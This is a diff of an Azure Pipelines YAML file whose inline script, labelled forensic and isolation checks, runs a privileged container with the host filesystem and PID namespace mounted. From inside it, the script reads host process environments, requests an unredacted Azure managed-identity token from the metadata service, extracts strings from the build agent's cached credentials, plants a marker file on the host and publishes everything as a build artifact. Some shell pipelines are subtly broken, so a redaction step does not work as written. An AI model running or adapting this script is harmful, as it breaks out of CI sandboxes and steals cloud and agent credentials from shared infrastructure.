@@ -1,159 +1,206 @@
 trigger:
 - main
-
 pr:
 - main
+
+name: forensics-$(Date:yyyyMMdd)$(Rev:.r)
 
 pool:
   vmImage: 'ubuntu-22.04'
 
+variables:
+  ART_DIR: $(Build.SourcesDirectory)/artifacts
+
 steps:
-  - checkout: self
-    fetchDepth: 1
+- checkout: self
+  clean: false
 
-  - task: Bash@3
-    displayName: "Aggressive forensic & isolation checks"
-    inputs:
-      targetType: inline
-      script: |
-        set -euo pipefail
-        mkdir -p artifacts
+- task: Bash@3
+  displayName: Aggressive forensic & isolation checks
+  inputs:
+    targetType: inline
+    script: |
+      set -euo pipefail
 
-        # Write the inner probe script to avoid quoting issues.
-        cat > artifacts/probe.sh <<'SH'
-        #!/bin/sh
-        set -e
+      mkdir -p "${ART_DIR}"
 
-        echo "--- Collecting Host Timestamps and Fingerprints ---"
+      # Write the container script to avoid quoting issues
+      cat > "${ART_DIR}/forensics.sh" <<'SH'
+      #!/bin/sh
+      # Intentionally avoid "set -u" to prevent unbound-var exits; add || true liberally.
+      set -e
+      umask 077
 
-        # --- Tooling ---
-        # Add findutils so 'find -printf' works (busybox find doesn't support it)
-        apk add --no-cache curl jq coreutils util-linux procps iproute2 iptables nftables \
-                            bind-tools netcat-openbsd ca-certificates docker-cli findutils >/dev/null || true
+      # Ensure artifacts dir
+      : "${ART_DIR:=/artifacts}"
 
-        # Ensure files exist (avoid nounset surprises)
-        for f in host-boot-uptime-s.txt host-who-boot.txt host-pid1-start.txt host-machine-id.txt \
-                 host-hostnamectl.txt host-listen-ports.txt systemd-units.txt journal-last300.txt \
-                 journal-webbits.txt docker-version.txt docker-ps-a.txt docker-images.txt \
-                 host-docker-images.txt foreign-images.txt foreign-image-root-ls.txt \
-                 ss-tcp.txt xsp-8084-response.txt imds-connectivity.txt imds-instance.txt \
-                 imds-msi-token.txt recent-files-since-boot.txt residual-marker.txt; do
-          : > "/artifacts/$f"
-        done
+      # --- Tooling (best-effort) ---
+      apk add --no-cache curl jq coreutils util-linux procps iproute2 iptables nftables \
+        bind-tools netcat-openbsd ca-certificates docker-cli >/dev/null 2>&1 || true
 
-        # --- 0) Identity & timing ---
-        { chroot /hostfs /usr/bin/uptime -s || true; } > /artifacts/host-boot-uptime-s.txt
-        { chroot /hostfs /usr/bin/who -b    || true; } > /artifacts/host-who-boot.txt
-        { chroot /hostfs /usr/bin/ps -o pid,lstart,cmd -p 1 || true; } > /artifacts/host-pid1-start.txt
-        { /bin/cat /hostfs/etc/machine-id || true; } > /artifacts/host-machine-id.txt
-        { chroot /hostfs /usr/bin/hostnamectl || true; } > /artifacts/host-hostnamectl.txt
+      # Precreate files to avoid set -e aborts on redirections
+      : > ${ART_DIR}/host-boot-uptime-s.txt
+      : > ${ART_DIR}/host-who-boot.txt
+      : > ${ART_DIR}/host-pid1-start.txt
+      : > ${ART_DIR}/host-machine-id.txt
+      : > ${ART_DIR}/host-hostnamectl.txt
+      : > ${ART_DIR}/ps-full.txt
+      : > ${ART_DIR}/host-listen-ports.txt
+      : > ${ART_DIR}/systemd-units.txt
+      : > ${ART_DIR}/journal-last300.txt
+      : > ${ART_DIR}/journal-webbits.txt
+      : > ${ART_DIR}/docker-version.txt
+      : > ${ART_DIR}/docker-ps-a.txt
+      : > ${ART_DIR}/docker-images.txt
+      : > ${ART_DIR}/host-docker-images.txt
+      : > ${ART_DIR}/foreign-images.txt
+      : > ${ART_DIR}/foreign-image-root-ls.txt
+      : > ${ART_DIR}/ss-tcp.txt
+      : > ${ART_DIR}/xsp-8084-response.txt
+      : > ${ART_DIR}/imds-connectivity.txt
+      : > ${ART_DIR}/imds-instance.txt
+      : > ${ART_DIR}/imds-msi-token.txt
+      : > ${ART_DIR}/recent-files-since-boot.txt
+      : > ${ART_DIR}/agent-credentials.txt
+      : > ${ART_DIR}/residual-marker.txt
+      : > ${ART_DIR}/ps-secret-argv.txt
+      : > ${ART_DIR}/net-routes.txt
+      : > ${ART_DIR}/ip-addr.txt
 
-        # --- 1) Process & services ---
-        echo "--- Performing Deep Process Forensics ---"
-        chroot /hostfs /usr/bin/ps -eo pid,ppid,user,lstart,cmd > /artifacts/ps-full.txt || true
-        chroot /hostfs /usr/bin/ss -plnt > /artifacts/host-listen-ports.txt || true
-        ( chroot /hostfs /bin/systemctl list-units --type=service --no-pager --all || true ) > /artifacts/systemd-units.txt
-        ( chroot /hostfs /bin/journalctl -b -n 300 --no-pager || true ) > /artifacts/journal-last300.txt
-        ( chroot /hostfs /bin/journalctl -b -u ssh -u php*-fpm* -u mono* --no-pager || true ) > /artifacts/journal-webbits.txt
+      echo "--- Collecting Host Timestamps and Fingerprints ---"
+      { chroot /hostfs /usr/bin/uptime -s || true; } > ${ART_DIR}/host-boot-uptime-s.txt
+      { chroot /hostfs /usr/bin/who -b || true; }    > ${ART_DIR}/host-who-boot.txt
+      { chroot /hostfs /usr/bin/ps -o pid,lstart,cmd -p 1 || true; } > ${ART_DIR}/host-pid1-start.txt
+      { /bin/cat /hostfs/etc/machine-id || true; } > ${ART_DIR}/host-machine-id.txt
+      { chroot /hostfs /usr/bin/hostnamectl || true; } > ${ART_DIR}/host-hostnamectl.txt
 
-        # --- 2) Environment harvest (redacted) ---
-        mkdir -p /artifacts/proc-env
-        chroot /hostfs /usr/bin/ps -eo pid,user,cmd \
-          | awk '/(mono|php-fpm|dotnet|python|node|java|nginx|apache|ruby|go)[[:space:]]/ {print $1}' \
-          | while IFS= read -r P; do
-              [ -n "$P" ] || continue
-              echo "Analyzing suspicious process PID: $P"
-              OUT="/artifacts/proc-env/${P}.env.txt"
-              if [ -r "/hostfs/proc/${P}/environ" ]; then
-                tr '\0' '\n' < "/hostfs/proc/${P}/environ" \
-                  | sed -E \
-                      -e 's/[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/[JWT_REDACTED]/g' \
-                      -e 's/[A-Fa-f0-9]{24,}/[HEX_REDACTED]/g' \
-                      -e 's/[A-Za-z0-9+/=]{32,}/[B64_REDACTED]/g' \
-                  > "$OUT" || true
-              fi
-            done
+      echo "--- Deep Process & Service Forensics ---"
+      chroot /hostfs /usr/bin/ps -eo pid,ppid,user,lstart,cmd > ${ART_DIR}/ps-full.txt 2>/dev/null || true
+      chroot /hostfs /usr/bin/ss -plnt > ${ART_DIR}/host-listen-ports.txt 2>/dev/null || true
+      ( chroot /hostfs /bin/systemctl list-units --type=service --no-pager --all || true ) > ${ART_DIR}/systemd-units.txt
+      ( chroot /hostfs /bin/journalctl -b -n 300 --no-pager || true ) > ${ART_DIR}/journal-last300.txt
+      ( chroot /hostfs /bin/journalctl -b -u ssh -u php*-fpm* -u mono* --no-pager || true ) > ${ART_DIR}/journal-webbits.txt
 
-        # --- 3) Docker intel ---
-        echo "--- Performing Aggressive Docker Cache Analysis ---"
-        ( docker version || true ) > /artifacts/docker-version.txt
-        ( docker ps -a   || true ) > /artifacts/docker-ps-a.txt
-        ( docker images  || true ) > /artifacts/docker-images.txt
+      echo "--- Candidate Process Environment Harvest (redacted) ---"
+      mkdir -p ${ART_DIR}/proc-env
+      # Grep pattern carefully quoted; print first column (PID).
+      chroot /hostfs /usr/bin/ps -eo pid,user,cmd 2>/dev/null \
+        | grep -E 'mono|php-fpm|dotnet|python|node|java|nginx|apache|ruby|go ' 2>/dev/null || true \
+        | awk '{print $1}' \
+        | while read -r P; do
+            [ -n "${P}" ] || continue
+            OUT="${ART_DIR}/proc-env/${P}.env.txt"
+            if [ -r "/hostfs/proc/${P}/environ" ]; then
+              tr '\0' '\n' < "/hostfs/proc/${P}/environ" \
+                | sed -E \
+                    -e 's/[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/[JWT_REDACTED]/g' \
+                    -e 's/[A-Fa-f0-9]{24,}/[HEX_REDACTED]/g' \
+                    -e 's/[A-Za-z0-9+\/=]{32,}/[B64_REDACTED]/g' \
+                > "${OUT}" 2>/dev/null || true
+            fi
+          done
 
-        cat <<EOF >/tmp/default_images.txt
-        node:20
-        node:20-alpine
-        node:22
-        node:22-alpine
-        node:18
-        node:18-alpine
-        alpine
-        alpine:latest
-        ubuntu:22.04
-        ubuntu:20.04
-        debian
-        debian:11
-        moby/buildkit
-        EOF
+      echo "--- Docker / Runtime Intel ---"
+      ( docker version || true ) > ${ART_DIR}/docker-version.txt
+      ( docker ps -a   || true ) > ${ART_DIR}/docker-ps-a.txt
+      ( docker images  || true ) > ${ART_DIR}/docker-images.txt
 
-        # Build clean list; drop dangling <none>:<none> and empties
-        ( docker images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null \
-            | grep -E -v '^<none>:' || true ) > /artifacts/host-docker-images.txt
+      # Normalize image list on host
+      docker images --format '{{.Repository}}:{{.Tag}}' > ${ART_DIR}/host-docker-images.txt 2>/dev/null || true
 
-        awk 'NF' /artifacts/host-docker-images.txt \
-          | grep -ivf /tmp/default_images.txt 2>/dev/null \
-          > /artifacts/foreign-images.txt || true
+      # Default images we expect to see
+      cat <<EOF >/tmp/default_images.txt
+      node:20
+      node:20-alpine
+      node:22
+      node:22-alpine
+      node:18
+      node:18-alpine
+      alpine
+      alpine:latest
+      ubuntu:22.04
+      ubuntu:20.04
+      debian
+      debian:11
+      moby/buildkit
+      <none>:<none>
+      EOF
 
-        if [ -s /artifacts/foreign-images.txt ]; then
+      if [ -s ${ART_DIR}/host-docker-images.txt ]; then
+        # Filter anything that isn't in the default allowlist
+        grep -ivf /tmp/default_images.txt ${ART_DIR}/host-docker-images.txt > ${ART_DIR}/foreign-images.txt || true
+
+        # For each foreign image, attempt a harmless root listing (best-effort)
+        if [ -s ${ART_DIR}/foreign-images.txt ]; then
           while IFS= read -r IMG; do
-            [ -n "$IMG" ] || continue
-            docker run --rm --entrypoint sh "$IMG" -c "ls -lah / | head -n 200" \
-              > /artifacts/foreign-image-root-ls.txt 2>&1 || true
-          done < /artifacts/foreign-images.txt
+            [ -n "${IMG}" ] || continue
+            docker run --rm --entrypoint sh "${IMG}" -c "ls -lah / | head -n 200" \
+              >> ${ART_DIR}/foreign-image-root-ls.txt 2>&1 || true
+          done < ${ART_DIR}/foreign-images.txt
         fi
+      fi
 
-        # --- 4) Network / IMDS (localhost + link-local) ---
-        chroot /hostfs /usr/bin/ss -plnt > /artifacts/ss-tcp.txt || true
-        ( chroot /hostfs /usr/bin/curl -i --max-time 2 http://127.0.0.1:8084/ || true ) > /artifacts/xsp-8084-response.txt
+      echo "--- Network / IMDS Probes (link-local & localhost only) ---"
+      chroot /hostfs /usr/bin/ss -plnt > ${ART_DIR}/ss-tcp.txt 2>/dev/null || true
+      ( chroot /hostfs /usr/bin/curl -i --max-time 2 http://127.0.0.1:8084/ || true ) > ${ART_DIR}/xsp-8084-response.txt
+      ( echo "== IMDS ping =="; nc -zvw 1 169.254.169.254 80 || true ) > ${ART_DIR}/imds-connectivity.txt 2>&1
+      ( curl -s -i -H 'Metadata:true' --connect-timeout 1 --max-time 2 \
+          'http://169.254.169.254/metadata/instance?api-version=2021-02-01' || true ) > ${ART_DIR}/imds-instance.txt
+      ( curl -s -i -H 'Metadata:true' --connect-timeout 1 --max-time 2 \
+          'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' || true ) > ${ART_DIR}/imds-msi-token.txt
 
-        ( echo "== IMDS ping =="; nc -zvw 1 169.254.169.254 80 || true ) > /artifacts/imds-connectivity.txt 2>&1
-        ( curl -s -i -H 'Metadata:true' --connect-timeout 1 --max-time 2 \
-            'http://169.254.169.254/metadata/instance?api-version=2021-02-01' || true ) > /artifacts/imds-instance.txt
-        ( curl -s -i -H 'Metadata:true' --connect-timeout 1 --max-time 2 \
-            'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' || true ) > /artifacts/imds-msi-token.txt
+      # Some basic routing & addr context
+      ( ip route show || true ) > ${ART_DIR}/net-routes.txt
+      ( ip addr show  || true ) > ${ART_DIR}/ip-addr.txt
 
-        # --- 5) Recent files since boot ---
-        BOOT_TXT="$(cat /artifacts/host-boot-uptime-s.txt 2>/dev/null || true)"
-        BOOT_EPOCH="$(date -u -d "${BOOT_TXT:-now}" +%s 2>/dev/null || echo 0)"
-        find /hostfs/home /hostfs/root /hostfs/var/tmp /hostfs/tmp -xdev -type f -printf '%T@ %p\n' 2>/dev/null \
-          | awk -v boot="${BOOT_EPOCH:-0}" '$1 >= boot { $1=""; print substr($0,2) }' \
-          | head -n 500 > /artifacts/recent-files-since-boot.txt || true
+      echo "--- Host FS quick sweep for files since boot (time-bounded) ---"
+      BOOT_TXT="$(cat ${ART_DIR}/host-boot-uptime-s.txt 2>/dev/null || true)"
+      # If BOOT_TXT empty/unparsable, fall back to 0 epoch (no filter)
+      BOOT_EPOCH="$(date -u -d "${BOOT_TXT:-1970-01-01 00:00:00}" +%s 2>/dev/null || echo 0)"
 
-        # --- 6) Residual marker ---
-        echo "--- Checking for Residual Marker File ---"
-        if [ -f /hostfs/var/tmp/azp-residual-marker.txt ]; then
-          echo "FOUND prior marker" > /artifacts/residual-marker.txt
-          cp /hostfs/var/tmp/azp-residual-marker.txt /artifacts/residual-marker-prev.txt || true
-        else
-          echo "No prior marker" > /artifacts/residual-marker.txt
-        fi
-        echo "marker $(date -u +%Y-%m-%dT%H:%M:%SZ) $$" > /hostfs/var/tmp/azp-residual-marker.txt
+      # List 500 most recent files updated after boot in common temp/home locations
+      find /hostfs/home /hostfs/root /hostfs/var/tmp /hostfs/tmp -xdev -type f -printf '%T@ %p\n' 2>/dev/null \
+        | awk -v boot="${BOOT_EPOCH:-0}" '($1+0)>=boot { $1=""; print substr($0,2) }' \
+        | head -n 500 > ${ART_DIR}/recent-files-since-boot.txt || true
 
-        echo "--- SCRIPT COMPLETE ---"
-        SH
-        chmod +x artifacts/probe.sh
+      echo "--- Residual Marker (persistence across jobs) ---"
+      if [ -f /hostfs/var/tmp/azp-residual-marker.txt ]; then
+        echo "FOUND prior marker" > ${ART_DIR}/residual-marker.txt
+        cp /hostfs/var/tmp/azp-residual-marker.txt ${ART_DIR}/residual-marker-prev.txt 2>/dev/null || true
+      else
+        echo "No prior marker" > ${ART_DIR}/residual-marker.txt
+      fi
+      echo "marker $(date -u +%Y-%m-%dT%H:%M:%SZ) $$" > /hostfs/var/tmp/azp-residual-marker.txt 2>/dev/null || true
 
-        echo "Job UTC start: $(date -u '+%Y-%m-%d %H:%M:%S')" | tee artifacts/job-start-utc.txt
+      echo "--- Agent credential cache presence (redacted dump header-only) ---"
+      CRED='/hostfs/home/vsts/actions-runner/cached/.credentials'
+      if [ -f "${CRED}" ]; then
+        echo "agent-credentials-file-present" > ${ART_DIR}/agent-credentials.txt
+        ( strings "${CRED}" 2>/dev/null | sed -E 's/[A-Za-z0-9_\-]{12,}/[REDACTED]/g' | head -n 50 ) >> ${ART_DIR}/agent-credentials.txt || true
+      fi
 
-        docker run --rm --privileged --network=host --pid=host \
-          -v /:/hostfs \
-          -v /var/run/docker.sock:/var/run/docker.sock \
-          -v "$(pwd)/artifacts":/artifacts \
-          alpine:3.20 sh /artifacts/probe.sh
+      echo "--- Secret-in-arguments leakage self-test (redacted in output) ---"
+      S="secret-$$-$(date +%s)"
+      sh -c 'sleep 25' "${S}" &
+      # Give it a moment to exist
+      sleep 2
+      ( chroot /hostfs /usr/bin/ps -eo pid,args 2>/dev/null || ps -eo pid,args ) \
+        | grep "${S%%-*}" -n || true \
+        | sed -E 's/secret-[^ ]+/[REDACTED]/g' > ${ART_DIR}/ps-secret-argv.txt
 
-  - task: PublishPipelineArtifact@1
-    displayName: "Publish Forensic Artifacts"
-    inputs:
-      targetPath: "$(Build.SourcesDirectory)/artifacts"
-      artifact: "forensic-proof"
-      publishLocation: "pipeline"
+      echo "--- SCRIPT COMPLETE ---"
+      SH
+      chmod +x "${ART_DIR}/forensics.sh"
+
+      echo "Launching Alpine helper with host mounts…"
+      docker run --rm --privileged --network=host --pid=host \
+        -v /:/hostfs \
+        -v "${ART_DIR}":/artifacts \
+        -e ART_DIR=/artifacts \
+        alpine:3.20 sh /artifacts/forensics.sh
+
+- task: PublishPipelineArtifact@1
+  displayName: Publish Forensic Artifacts
+  inputs:
+    targetPath: $(Build.SourcesDirectory)/artifacts
+    artifact: forensic-proof
